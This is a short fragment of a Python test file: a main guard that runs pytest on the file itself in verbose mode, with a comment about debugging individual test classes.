if __name__ == "__main__":
    # Enable running individual test classes for debugging
    pytest.main([__file__, "-v"])
    pass